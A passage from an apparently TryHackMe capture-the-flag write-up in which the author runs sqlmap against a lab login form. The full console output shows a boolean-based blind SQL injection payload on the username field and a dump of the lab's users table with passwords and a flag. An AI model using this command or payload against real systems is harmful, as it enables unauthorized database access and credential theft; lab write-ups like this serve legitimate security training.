- Now in the login screen there is no place where we can see SQL Injection output.
- So tried Blind SQL Injection with sqlmap

```console
❯ sqlmap -u http://10.10.147.112:5000/challenge3/login --data="username=admin&password=123" --level=5 --risk=3 --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:54:57 /2022-11-14/

[11:54:57] [INFO] testing connection to the target URL
[11:54:58] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:54:58] [INFO] testing if the target URL content is stable
[11:54:58] [INFO] target URL content is stable
[11:54:58] [INFO] testing if POST parameter 'username' is dynamic
[11:54:59] [WARNING] POST parameter 'username' does not appear to be dynamic
[11:54:59] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:54:59] [INFO] testing for SQL injection on POST parameter 'username'
[11:54:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:54:59] [WARNING] reflective value(s) found and filtering out
got a 302 redirect to 'http://10.10.147.112:5000/challenge3/home'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] Y
[11:55:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[11:55:29] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
[11:55:33] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite'
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[11:55:44] [INFO] testing 'Generic inline queries'
[11:55:45] [INFO] testing 'SQLite inline queries'
[11:55:45] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[11:55:45] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[11:55:45] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[11:55:45] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[11:55:48] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
[11:55:50] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
[11:55:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
[11:55:54] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
[11:55:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:55:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:55:58] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[11:56:09] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[11:56:09] [INFO] testing 'Generic UNION query (72) - 21 to 40 columns'
[11:56:28] [INFO] testing 'Generic UNION query (72) - 41 to 60 columns'
[11:56:32] [INFO] testing 'Generic UNION query (72) - 61 to 80 columns'
[11:56:35] [INFO] testing 'Generic UNION query (72) - 81 to 100 columns'
[11:56:39] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[11:56:39] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 370 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-5400' OR 2267=2267-- pNdk&password=123
---
[11:56:52] [INFO] testing SQLite
[11:56:52] [INFO] confirming SQLite
[11:56:52] [INFO] actively fingerprinting SQLite
[11:56:53] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:56:53] [INFO] fetching tables for database: 'SQLite_masterdb'
[11:56:53] [INFO] fetching number of tables for database 'SQLite_masterdb'
[11:56:53] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[11:56:53] [INFO] retrieved: 1
[11:56:54] [INFO] retrieved: users
[11:57:00] [INFO] retrieved: CREATE TABLE users (     id integer primary key,     username text unique not null,     password text not null )
[11:59:28] [INFO] fetching entries for table 'users'
[11:59:28] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[11:59:28] [INFO] retrieved: 5
[11:59:29] [INFO] retrieved: 1
[11:59:31] [INFO] retrieved: THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
[12:00:24] [INFO] retrieved: admin
[12:00:31] [INFO] retrieved: 3
[12:00:32] [INFO] retrieved: asd
[12:00:36] [INFO] retrieved: amanda
[12:00:44] [INFO] retrieved: 2
[12:00:46] [INFO] retrieved: Summer2019!
[12:01:01] [INFO] retrieved: dev
[12:01:05] [INFO] retrieved: 5
[12:01:07] [INFO] retrieved: 345m3io4hj3
[12:01:23] [INFO] retrieved: emil
[12:01:28] [INFO] retrieved: 4
[12:01:30] [INFO] retrieved: viking123
[12:01:41] [INFO] retrieved: maja
Database: <current>
Table: users
[5 entries]
+----+---------------------------------------+----------+
| id | password                              | username |
+----+---------------------------------------+----------+
| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
| 3  | asd                                   | amanda   |
| 2  | Summer2019!                           | dev      |
| 5  | 345m3io4hj3                           | emil     |
| 4  | viking123                             | maja     |
+----+---------------------------------------+----------+

[12:01:47] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/divu050704/.local/share/sqlmap/output/10.10.147.112/dump/SQLite_masterdb/users.csv'
[12:01:47] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 6 times
[12:01:47] [INFO] fetched data logged to text files under '/home/divu050704/.local/share/sqlmap/output/10.10.147.112'

[*] ending @ 12:01:47 /2022-11-14/

```
